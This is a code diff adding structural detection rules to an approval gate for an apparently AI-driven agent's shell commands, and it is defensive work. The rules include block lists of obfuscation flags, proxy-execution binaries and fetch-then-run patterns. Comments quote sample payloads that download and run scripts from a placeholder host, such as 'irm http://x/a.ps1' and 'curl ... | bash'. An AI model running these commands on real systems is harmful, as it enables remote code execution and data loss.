@@ -5,6 +5,7 @@ Destruction gate — classifies actions and gates destructive ones.
 from __future__ import annotations
 
 import logging
+import re
 
 log = logging.getLogger("addled.gate")
 
@@ -173,6 +174,100 @@ def _is_destructive_powershell(cmd: str) -> bool:
     return False
 
 
+
+# ---------------------------------------------------------------------------
+# Structural rules: what a command is BUILT OUT OF, not what words it holds.
+#
+# The word list above matches names. Measured against the live install, five
+# real payloads passed it: `powershell -enc SQBFAFgA`, `pwsh -c irm
+# http://x/a.ps1`, `certutil -urlcache`, `mshta`, `regsvr32 /s /i:http://x`,
+# and `Copy-Item -Recurse -Force C:/a C:/b` - the last being the very example
+# the word list's own comment says it exists to catch, because `copy-item` is
+# not one of its verbs.
+#
+# These rules read shape instead. Each describes a capability (hide a payload,
+# proxy execution through another binary, download and run, copy a tree)
+# rather than a spelling, so rewording does not evade it.
+# ---------------------------------------------------------------------------
+
+# Flags whose purpose is to hide what actually runs.
+_OBFUSCATION_FLAGS = (
+    "-enc ", "-encodedcommand", "-executionpolicy bypass", "-ep bypass",
+    "-exec bypass", "-windowstyle hidden",
+)
+
+# Binaries that exist mainly to run or fetch something else.
+_LOLBINS = (
+    "mshta", "regsvr32", "rundll32", "bitsadmin", "certutil", "wmic ",
+    "invoke-webrequest", "invoke-restmethod", "start-bitstransfer",
+    "downloadstring", "downloadfile", "iex ", "invoke-expression",
+    # PowerShell aliases of the above. `irm` IS Invoke-WebRequest, so a rule
+    # that only knew the long form missed `pwsh -c irm http://x/a.ps1`.
+    "irm ", "iwr ",
+)
+
+# Fetching is not the danger; fetching and RUNNING is. `curl` and `wget` are
+# left out of `_LOLBINS` on purpose - a read-only fetch is a legitimate thing
+# for an agent to do, and gating it would train the user to approve without
+# reading. They are gated only when paired with an executor below.
+_FETCHERS = ("irm ", "iwr ", "curl ", "wget ", "invoke-webrequest",
+             "invoke-restmethod", "certutil -urlcache", "start-bitstransfer")
+
+# A payload leaving the page and becoming a process.
+_EXECUTORS = ("| iex", "|iex", "| invoke-expression", "|invoke-expression",
+              " -outfile", "downloadstring", "-o ", "-outfile")
+
+# Recursive tree operations. `-recurse` turns a one-file operation into a
+# whole tree, which is the difference between a mistake and a loss.
+_RECURSIVE_VERBS = ("copy-item", "move-item", "remove-item", "rm ",
+                    "rmdir", "rd /s", "del /", "cp ", "mv ", "rsync")
+
+# Shapes the classifier cannot resolve with confidence. Present -> gate.
+#
+# Only constructs that BUILD CODE belong here. A bare `$(` or a backtick is
+# ordinary PowerShell - `echo $(Get-Date)`, `git commit -m \`date\`` - and
+# gating it made the gate cry wolf on the daily driver, which is how a gate
+# gets switched off. What matters is the case where the output becomes a
+# command: `& $(...)`, `iex (...)`, `[scriptblock]::Create`.
+_UNREADABLE = (
+    "& $(", "iex (", "invoke-expression (", "| iex",
+    "[scriptblock]", "add-type",
+)
+
+
+def is_structurally_dangerous(cmd: str) -> bool:
+    """Does this command have the SHAPE of something that must be approved?
+
+    Generous on purpose: a false positive costs one approval card, and a false
+    negative is a command the user never saw.
+    """
+    c = " ".join(str(cmd or "").lower().split())
+    if not c:
+        return False
+    if any(flag in c for flag in _OBFUSCATION_FLAGS):
+        return True
+    if any(b in c for b in _LOLBINS):
+        return True
+    # Fetch-then-run, in either order. Piping a download into an interpreter
+    # is the canonical one; `-OutFile` says the fetched bytes are being kept
+    # somewhere, which is only interesting when a second step runs them, so
+    # that alone is not enough.
+    # Any pipe out of a fetcher is enough: whatever is downstream is being
+    # handed fetched bytes it will interpret. `curl ... | bash` and
+    # `wget -qO- ... | sh` are the classic shape, and `| iex` is PowerShell's.
+    if any(f in c for f in _FETCHERS) and "|" in c:
+        return True
+    if "downloadstring" in c or "downloadfile" in c:
+        return True
+    # `-Recurse` and the short-flag aliases that mean the same thing. Matched
+    # as whole flags so `-r` does not fire on `-ref` or a bare `-run`.
+    recursive = "-recurse" in c or re.search(r"(^|\s)-r(\s|$)", c)
+    if recursive and any(v in c for v in _RECURSIVE_VERBS):
+        return True
+    if any(s in c for s in _UNREADABLE):
+        return True
+    return False
+
 class DestructionGate:
     """Classifies actions as safe or destructive."""
 
@@ -203,19 +298,27 @@ class DestructionGate:
             # user to approve without reading. So its content is consulted - but
             # only to decide whether to ask, never to decide it is safe to skip
             # the name check above.
-            cmd = params.get("command", "").lower().strip()
+            cmd = str(params.get("command", "") or "").strip()
             if not cmd:
                 return False  # nothing to run
-            if is_compound_dangerous(cmd):
+            # Shape first. A word list can only match names it was told about,
+            # and five measured payloads were written in ways it never was
+            # (`-enc`, `irm|iex`, `certutil`, `mshta`, `Copy-Item -Recurse`).
+            # This is also the fail-closed half: anything built from a shape
+            # the classifier cannot read is gated rather than assumed safe.
+            if is_structurally_dangerous(cmd):
+                return True
+            lowered = cmd.lower()
+            if is_compound_dangerous(lowered):
                 return True
             # The canonical dangerous-command set from terminal.py, so there is
             # exactly one list to keep in sync. `Remove-Item` and the other
             # PowerShell spellings are matched here rather than in the prefix
             # table, because this is the shell Addled actually runs.
             from backend.actions.terminal import DANGEROUS_COMMANDS
-            if any(matches_dangerous(cmd, c) for c in DANGEROUS_COMMANDS):
+            if any(matches_dangerous(lowered, c) for c in DANGEROUS_COMMANDS):
                 return True
-            return _is_destructive_powershell(cmd)
+            return _is_destructive_powershell(lowered)
         if action_type == "delete_file":
             return True
         return False
